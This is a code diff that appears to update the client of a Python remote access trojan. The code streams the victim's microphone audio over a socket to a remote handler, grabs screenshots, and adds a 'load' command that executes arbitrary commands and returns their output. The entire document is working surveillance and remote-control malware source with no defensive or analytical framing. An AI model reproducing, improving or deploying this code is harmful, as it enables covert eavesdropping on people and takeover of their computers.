@@ -99,6 +99,12 @@ def openurl(command):
     browser.open(url)
 
 def listen_audio():
+    try:
+        import pyaudio
+    except:
+        unicorn.send("fail".encode("UTF-8"))
+        return
+    unicorn.send("success".encode("UTF-8"))
     CHUNK = 1024 * 4
     FORMAT = pyaudio.paInt16
     CHANNELS = 2
@@ -109,17 +115,23 @@ def listen_audio():
                     rate=RATE,
                     input=True,
                     frames_per_buffer=CHUNK)
-
     while True:
-        cont = unicorn.recv().decode("UTF-8", "ignore").strip()
-        if cont == "continue":
+        continue_stream = unicorn.recv()
+        print(continue_stream)
+        if continue_stream == b"break":
+            stream.stop_stream()
+            stream.close()
+            p.terminate()
+            return
+        else:
             try:
                 data = stream.read(CHUNK)
                 unicorn.send(data)
             except:
-                break
-        else:
-            break
+                stream.stop_stream()
+                stream.close()
+                p.terminate()
+                return
 
 def screenshot():
     image = ImageGrab.grab()
@@ -150,6 +162,12 @@ def shell(handler=handler):
                 screenshot()
             elif ui[0] == "mic":
                 listen_audio()
+            elif ui[0] == "load":
+                if len(ui) < 2:
+                    pass
+                else:
+                    payload_output = execute("".join(command.split("load")).strip())
+                    unicorn.send(bytes(payload_output.strip()))
             elif ui[0] == "exit":
                 s.shutdown(2)
                 s.close()
